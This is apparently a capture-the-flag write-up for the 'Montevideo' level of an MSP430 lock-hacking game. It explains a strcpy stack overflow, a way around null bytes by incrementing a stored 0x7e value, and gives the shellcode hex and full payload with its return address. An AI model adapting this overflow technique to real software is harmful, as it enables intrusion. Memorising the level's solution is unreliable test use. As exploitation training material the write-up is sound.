# Montevideo

This challenge has the same problem as the prior ones (more input allowed that desired) <br>

It also tries to complicate our life by using **memset** in order to clear **0x64** (d:100) bytes in which the values are initially read into. It also clears more than can be read, which is **0x30** (d:48). <br>

The problem is that the values are copied to the stack (which, at the moment of copy, are placed at **0x43ee**) thus the memset does not hit these values <br>

So we can use the same approach as before, but now we have another problem. **Strcpy** stops at null bytes and a bunch of instructions will produce them (including ```push 0x7f```) <br>

My intial approach did not went very well. It comprised the following steps:
- craft gets call
- input 7f directly to sp
- call INT (0x454c in this program)

it seems alright, but why it didn't work? well, the gets function manipulates the stack on leaving, messing our last call instruction 

```assembly
45a0 <getsn>
45a0:  0e12           push	r14
45a2:  0f12           push	r15
45a4:  2312           push	#0x2
45a6:  b012 4c45      call	#0x454c <INT>
45aa:  3150 0600      add	#0x6, sp        <- Will mess our idea
45ae:  3041           ret
```

So, i tried a bunch of other ideas but the last one was the one (no shit sherlock !) :D <br>

So, i tried to find a value close to **0x7f** already in memory. Turns out that, in every execution, the address **0x445e** has **0x7e** stored 

```s
4450:   fcff 3e40 fcff 0e54 0e12 0f12 3012 7e00   ..>@...T....0.~.
```

So, we can just do this:
- increment the value at the address (by using other very cool trick that'll show in a sec)
- push the value within the address into the stack
- call INT

This idea, to get access to that address, originated from what i've seen from these challenges code:
- zero out a register
- assume that it is a memory location
- index access whatever you want

```assembly
xor r12, r12        ; zero r12
inc 0x445e(r12)     ; access that address with indexing and increment it
push 0x445e(r12)    ; push the value
call #0x454c        ; call INT
```

By assembling this small piece of code, we have the following shellcode: ```0cec9c535e441c125e44b0124c45```  <br>

In the same way as the prior challenges, we need some additional padding and address to when **ret** is hit. In my case it went like so:
```
$shellcode=0cec9c535e441c125e44b0124c45
$padding=4141
$address=ee43

# payload =  0cec9c535e441c125e44b0124c454141ee43
```
